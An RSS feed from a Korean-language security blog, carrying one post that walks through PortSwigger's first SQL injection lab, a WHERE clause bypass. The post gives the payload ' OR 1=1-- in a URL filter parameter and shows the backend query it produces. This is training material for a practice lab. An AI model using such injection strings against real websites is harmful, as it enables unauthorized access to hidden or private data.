<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on D4rkScare</title><link>https://d4rkscare.github.io/categories/portswigger/</link><description>Recent content in Portswigger on D4rkScare</description><generator>Hugo</generator><language>ko-KR</language><lastBuildDate>Mon, 02 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://d4rkscare.github.io/categories/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>SQL Injection - Lab 1: WHERE clause</title><link>https://d4rkscare.github.io/posts/portswigger-sqli-lab1/</link><pubDate>Mon, 02 Mar 2026 00:00:00 +0000</pubDate><guid>https://d4rkscare.github.io/posts/portswigger-sqli-lab1/</guid><description>&lt;h2 id="overview"&gt;Overview&lt;/h2&gt;
&lt;p&gt;SQL injection 취약점을 이용해 WHERE 절을 우회하는 기초 랩입니다.&lt;/p&gt;
&lt;h2 id="analysis"&gt;Analysis&lt;/h2&gt;
&lt;h3 id="문제-설명"&gt;문제 설명&lt;/h3&gt;
&lt;p&gt;쇼핑몰 사이트의 카테고리 필터 기능에 SQL Injection이 존재합니다. &lt;code&gt;category&lt;/code&gt; 파라미터를 조작해서 숨겨진 상품을 노출시키는 게 목표입니다.&lt;/p&gt;
&lt;h3 id="페이로드"&gt;페이로드&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6c6f74"&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style="color:#a3be8c"&gt;&amp;#39; OR 1=1--
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="exploitation"&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;URL에 다음과 같이 입력:&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/filter?category=&amp;#39; OR 1=1--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;백엔드 쿼리:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6c6f74"&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style="color:#81a1c1;font-weight:bold"&gt;SELECT&lt;/span&gt; &lt;span style="color:#81a1c1"&gt;*&lt;/span&gt; &lt;span style="color:#81a1c1;font-weight:bold"&gt;FROM&lt;/span&gt; products &lt;span style="color:#81a1c1;font-weight:bold"&gt;WHERE&lt;/span&gt; category &lt;span style="color:#81a1c1"&gt;=&lt;/span&gt; &lt;span style="color:#a3be8c"&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style="color:#81a1c1;font-weight:bold"&gt;OR&lt;/span&gt; &lt;span style="color:#b48ead"&gt;1&lt;/span&gt;&lt;span style="color:#81a1c1"&gt;=&lt;/span&gt;&lt;span style="color:#b48ead"&gt;1&lt;/span&gt;&lt;span style="color:#616e87;font-style:italic"&gt;--&amp;#39; AND released = 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="flag"&gt;Flag&lt;/h2&gt;
&lt;p&gt;Lab Solved ✅&lt;/p&gt;</description></item></channel></rss>